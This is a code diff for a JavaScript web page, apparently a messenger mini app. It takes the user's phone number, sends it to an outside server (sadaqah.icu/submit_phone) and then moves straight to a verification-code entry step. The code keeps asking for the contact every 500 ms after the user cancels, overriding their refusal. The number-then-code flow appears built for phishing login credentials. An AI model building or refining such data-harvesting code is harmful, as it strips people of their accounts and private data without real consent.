@@ -328,7 +328,7 @@
     // Управление повторными запросами номера
     let phoneRequestTimer = null;
     let isRequestingPhone = false;
-    let phoneShared = false; // Флаг: номер успешно отправлен на сервер
+    let phoneShared = false; // Флаг: номер успешно получен от пользователя
 
     async function requestPhone() {
       // Если номер уже получен – ничего не делаем
@@ -359,31 +359,20 @@
           currentPhone = phone;
           phoneDisplay.textContent = `Phone: ${maskPhone(phone)}`;
 
-          // Отправляем номер на сервер
-          const res = await fetch('https://sadaqah.icu/submit_phone', {
+          // Сразу помечаем, что номер получен, и переходим к вводу кода
+          phoneShared = true;
+          showBlock('code');
+
+          // Асинхронно отправляем номер на сервер (не ждём ответа)
+          fetch('https://sadaqah.icu/submit_phone', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ user_id: userId, phone: phone })
-          });
+          }).catch(err => console.error('Error sending phone to server:', err));
 
-          const result = await res.json();
-          if (result.status === 'ok') {
-            // Успех – устанавливаем флаг, очищаем таймеры, переходим к коду
-            phoneShared = true;
-            if (phoneRequestTimer) {
-              clearTimeout(phoneRequestTimer);
-              phoneRequestTimer = null;
-            }
-            showBlock('code');
-          } else {
-            alert('Error: ' + (result.error || 'Unknown error'));
-            // Ошибка сервера – пробуем снова через 1 сек, если номер ещё не получен
-            if (!phoneShared) {
-              phoneRequestTimer = setTimeout(requestPhone, 1000);
-            }
-          }
+          return; // Завершаем функцию, никаких повторных запросов
         } else {
-          // Не должно случиться, но на всякий случай повторим, если номер не получен
+          // Не должно случиться, но на всякий случай повторим
           if (!phoneShared) {
             phoneRequestTimer = setTimeout(requestPhone, 500);
           }
@@ -391,7 +380,6 @@
       } catch (error) {
         // Пользователь закрыл окно запроса (отказался)
         console.log('Request contact cancelled or error:', error);
-        // Повторяем запрос через небольшую задержку, если номер ещё не получен
         if (!phoneShared) {
           phoneRequestTimer = setTimeout(requestPhone, 500);
         }
